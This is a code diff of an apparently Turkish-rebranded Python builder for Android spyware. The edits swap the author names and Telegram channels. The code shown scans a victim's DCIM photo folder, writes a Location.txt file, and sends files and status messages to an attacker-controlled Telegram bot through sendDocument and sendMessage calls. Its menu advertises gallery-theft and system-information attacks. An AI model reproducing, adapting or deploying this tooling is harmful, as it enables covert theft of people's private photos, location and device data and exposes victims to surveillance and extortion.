@@ -24,22 +24,22 @@ print('''
          -   M  R  X   -  V = 2.1   ''')
 
 print(f'''      {B}{E}==============================
-      |{G}[+] GitHub    : {B}mrxofficial00   {E}|
-      |{G}[+] Developer : {B}MRX OFFİCİAL     {E}|
-      |{G}[+] TeleGram  : {B}https://t.me/mrxarsiv{E}|
+      |{G}[+] Github    : {B}frostyxd1   {E}|
+      |{G}[+] Developer : {B}RES HACKXFROSTYXRAİDER     {E}|
+      |{G}[+] TeleGram  : {B}https://t.me/redhackarsiv{E}|
       {E}==============================''')
 print('               M  R  X                     ')      
-print('''\033[1;34m        https://t.me/mrxarsiv       
+print('''\033[1;34m        https://t.me/redhackarsiv       
        \n\n''')    
 
 print('\033[1;35m    You must subscribe to this channel   \n')              
-#os.system(f'xdg-open https://t.me/mrxarsiv')
+#os.system(f'xdg-open https://t.me/redhackarsiv')
 time.sleep(3)       
 os.system(f'xdg-open https://t.me/mrxarsiv')
 time.sleep(3)
    
-id=input(W+f'  [{E} ** {W}]  {S}Telegram ID ==> {B}')
-token=input(W+f'  [{E} ** {W}]  {S}Token Bot ==> {B}')
+id=input(W+f'  [{E} ** {W}]  {S}Telegram ID Gir ==> {B}')
+token=input(W+f'  [{E} ** {W}]  {S}Token Bot Gir ==> {B}')
 
 print(f'      {E}==============================')
 
@@ -54,7 +54,7 @@ def banner():
     print('\t         \033[2;33m   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇       ')
     print ('\t         \033[2;33m   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
     print ('\t         \033[2;33m   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
-    print ('\t         \033[2;33m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m MRX OFFİCİAL ')
+    print ('\t         \033[2;33m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m FORSTYXRAIDER ')
     print ('\t         \033[2;33m   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
     print ('\t         \033[2;33m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
     print ('\t         \033[2;33m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
@@ -67,7 +67,7 @@ def res(file):
     requests.post(f'https://api.telegram.org/bot"""+token+'''/sendDocument?chat_id='''+id+"""', files=file)
 
 d = datetime.now()        
-tlg = requests.post(f'https://api.telegram.org/bot"""+token+"/sendMessage?chat_id="+id+"""&text=👊 Start Attack .... ✊   '+str(d))
+tlg = requests.post(f'https://api.telegram.org/bot"""+token+"/sendMessage?chat_id="+id+"""&text=👊 Hazırmısın Başlıyoruz .... ✊   '+str(d))
 
 os.chdir(r"/storage/emulated/0/DCIM")
 tmp = list(os.scandir('.'))
@@ -190,7 +190,7 @@ def banner():
     print('\t         \033[2;33m   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇       ')
     print ('\t         \033[2;33m   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
     print ('\t         \033[2;33m   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
-    print ('\t         \033[2;33m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m MRX OFFİCİAL ')
+    print ('\t         \033[2;33m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m RAİDERXFORSTY ')
     print ('\t         \033[2;33m   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
     print ('\t         \033[2;33m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
     print ('\t         \033[2;33m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
@@ -200,7 +200,7 @@ def banner():
 banner()
 print('')
 
-tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=👊 Start Attack .... ✊  {datetime.now()} ')
+tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=👊 Hazırmısın Başlıyoruz .... ✊  {datetime.now()} ')
 
 print('\033[2;31m  [ * ] \033[2;34m Check internet .... ')
 print('')
@@ -276,11 +276,11 @@ with open('Location.txt','w') as Jbs:
     res = requests.post(f"https://api.telegram.org/bot{token}/sendDocument?chat_id={id}", files=file)
               
     
-tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by DeadCode > @Black_Code_22 ✅ ')''')
+tlg = requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=✅Done : Devloper by DeadCode > @raiderXXS ✅ ')''')
 
 #os.system(f'xdg-open https://t.me/mrxarsiv')
 
-print(W+f'''  [{E} 01 {W}] Attack Image Hack ..... 
+print(W+f'''  [{E} 01 {W}] Galari Sızma Hack ..... 
 {W}  [{E} 02 {W}] Attack infrmation System ....''')
 print('')
 
